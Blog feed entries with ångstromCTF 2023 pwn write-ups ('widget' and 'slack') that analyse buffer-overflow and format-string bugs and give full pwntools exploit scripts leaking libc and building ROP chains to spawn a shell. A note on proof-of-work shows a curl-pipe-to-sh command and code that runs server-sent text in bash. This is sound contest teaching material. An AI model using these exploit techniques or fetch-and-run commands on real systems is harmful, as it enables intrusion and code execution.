        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I seem to have lost my gadgets.<br><code>nc challs.actf.co 31320</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[116 solves &#x2F; 110 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="keyword">if</span> ( called )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  called = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Amount: &quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Contents: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v4);                             <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;bad %d\n&quot;</span>, i);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);                           <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>fsb</code> vulnerability. But I canâ€™t use <code>n</code> format string. I can only leak the stack address. But I can overwrite return address because of <code>bof</code> vulnerability. I can adjust input size.</p><p>I can find <code>win()</code> also.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">win</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a1, <span class="string">&quot;14571414c5d9fe9ed0698ef21065d8a6&quot;</span>, <span class="number">0x20</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a2, <span class="string">&quot;willy_wonka_widget_factory&quot;</span>, <span class="number">0x1A</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This <code>win()</code> needs arguments to call. But I was not use this function. I can get libcâ€™s address, So I can easily run the <code>system()</code>.</p><p>If you use this trick, It is important <code>rbp</code> have to in valid address.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak the libcâ€™s address and ret2main</li><li>ret2libc (<code>system</code>)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main2 = <span class="number">0x4013E3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./widgetp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31320</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./widgetp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%3$p\n&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x404800</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(main2)</span><br><span class="line"><span class="comment"># payload += p64(0x401296)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = <span class="number">0x2be51</span></span><br><span class="line">ret = <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x40402C</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x12345678)</span></span><br><span class="line">payload += p64(pop_rdi + libc.address)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret + libc.address)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 - slack (fsb)</title>
      <link href="/230427-angstromctf2023-5.slack/"/>
      <url>/230427-angstromctf2023-5.slack/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Join the Ã¥ngstromCTF slack!<br><code>nc challs.actf.co 31500</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[64 solves &#x2F; 140 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span> <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to slack (not to be confused with the popular chat service Slack)!&quot;</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    v4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- slack Bot:  %s\n&quot;</span>, s, (&amp;messages)[v4 % <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your message (to increase character limit, pay $99 to upgrade to Professional): &quot;</span>);</span><br><span class="line">    fgets(format, <span class="number">14</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line">    strftime(s, <span class="number">0x1A</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s -- You: &quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v13 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I just found the 3rd <code>fsb</code> only in this CTF. haha.</p><p>Anyway, only the buffer is 14 bytes. Actually 1 byte is for NULL. (Because <code>fgets()</code> receives string.)</p><p>Be careful when inputting with the <code>fgets()</code> becuase it receives an enter(â€˜\nâ€™). It means if you send 13 bytes, youâ€™ll have to send without â€˜\nâ€™. And if you send under 13 bytes, youâ€™ll have to send including â€˜\nâ€™.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>We canâ€™t do overwriting because of <code>FULL RELRO</code>. </p><img src="/images/230427-angstromctf2023-5.slack/Screenshot 2023-04-27 at 18.03.16.png" width=500/><br><p>I need to get redâ€™s offest(25) and yellowâ€™s offset(55).</p><p>First, I access the redâ€™s offset, and then write a <code>ptr_idx + 3</code> address. Because <code>ptr_idx</code> is small, so I have limit to trigger <code>fsb</code> vulnerability. So, I have to unlock this limit. I access yellowâ€™s offset, and write a 0x80. Because I want to make <code>ptr_idx</code> as a negative.</p><p>So, I can trigger <code>fsb</code> vulnerability infinitely!! This rule also applies when <code>rop_payload</code> write to the stack.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./slackp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31500</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./slackp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p_%9$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x2206a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 25ë²ˆì§¸ì— ì €ìž¥ëœ ì£¼ì†Œ 0x00007fffe4063d28 </span></span><br><span class="line">ptr_idx = stack_leak + <span class="number">0x2128</span> </span><br><span class="line">info(<span class="string">&#x27;ptr_idx :: &#x27;</span> + <span class="built_in">hex</span>(ptr_idx))</span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;(ptr_idx+<span class="number">3</span>) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hnì€ 2ë°”</span></span><br><span class="line">info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%128c%55$hhn&#x27;</span>) <span class="comment"># hhnì€ 1ë°”</span></span><br><span class="line"><span class="comment"># gef&gt; x/wx $rbp-0x68</span></span><br><span class="line"><span class="comment"># 0x7fff51b42e88: 0x80000003  </span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_payload += p64(pop_rdi)</span><br><span class="line">rop_payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">stack_ret = stack_leak + <span class="number">0x2198</span></span><br><span class="line"><span class="comment"># rop_payloadë¥¼ stack_retë¶€í„° 1ë°”ì´íŠ¸ì”© ì¨ì•¼ í•œë‹¤.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_payload)):</span><br><span class="line">    <span class="comment"># 1. 25ì— ì ‘ê·¼í•´ì„œ 55ë²ˆì§¸ì— stack_ret 2ë°”ì´íŠ¸ì”© ì“°ê¸°</span></span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;(stack_ret+i) &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 55ì— ì ‘ê·¼í•´ì„œ(stack_retì— ì ‘ê·¼í•´ì„œ) rop_payload 1ë°”ì´íŠ¸ì”© ì“°ê¸°</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> rop_payload[i] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#info(hex(rop_payload[i]))</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        payload = <span class="string">f&#x27;%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># sendë¡œ ë³´ë‚´ë©´ ì•ˆë¨</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        payload = <span class="string">f&#x27;%<span class="subst">&#123;rop_payload[i]&#125;</span>c%55$hhn&#x27;</span> </span><br><span class="line">        p.sendline(payload) <span class="comment"># sendë¡œ ë³´ë‚´ë©´ ì•ˆë¨</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># stack_retì— rop_payload ì ì–´ì£¼ê³  í”„ë¡œê·¸ëž¨ì„ ì¢…ë£Œë˜ê²Œ ë§Œë“¤ì–´ì•¼ í•¨</span></span><br><span class="line"><span class="comment"># ptr_idxì— 2 ë„£ì–´ì£¼ìž.</span></span><br><span class="line">payload = <span class="string">f&#x27;%<span class="subst">&#123;ptr_idx &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span> <span class="comment"># hnì€ 2ë°”</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%2c%55$n&#x27;</span>) <span class="comment"># nì€ 4ë°”</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>If you want to make function that writes <code>rop_payload</code> to the stack, you can do it like this. :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte</span>(<span class="params">addr, value</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;%<span class="subst">&#123;addr &amp; <span class="number">0xffff</span>&#125;</span>c%25$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;write <span class="subst">&#123;<span class="built_in">hex</span>(value)&#125;</span> to <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) == <span class="number">13</span>:</span><br><span class="line">        p.send(payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Professional):&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%55$hhn&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">f&#x27;%<span class="subst">&#123;value&#125;</span>c%55$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;succesfu1_onb0arding_f99454d9a2f42632&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - proof of work (remote)</title>
      <link href="/230426-pwn-proof-of-work/"/>
      <url>/230426-pwn-proof-of-work/</url>
      
        <content type="html"><![CDATA[<p>ì£¼ë¡œ í¬ë„ˆë¸” ë¬¸ì œì—ì„œ ë¦¬ëª¨íŠ¸ì— ì—°ê²°í–ˆì„ ë•Œ ë¸Œí¬ ë°©ì§€ë¥¼ ìœ„í•´ <code>proof of work</code>ë¥¼ ìš”êµ¬í•˜ëŠ” ê²½ìš°ê°€ ìžˆë‹¤.</p><h2 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proof of work: curl -sSfL https://pwn.red/pow | sh -s s.AAAdTA==.Ae+rYf3l1Pg/Ib8DPnqHKw==</span><br><span class="line">solution: </span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
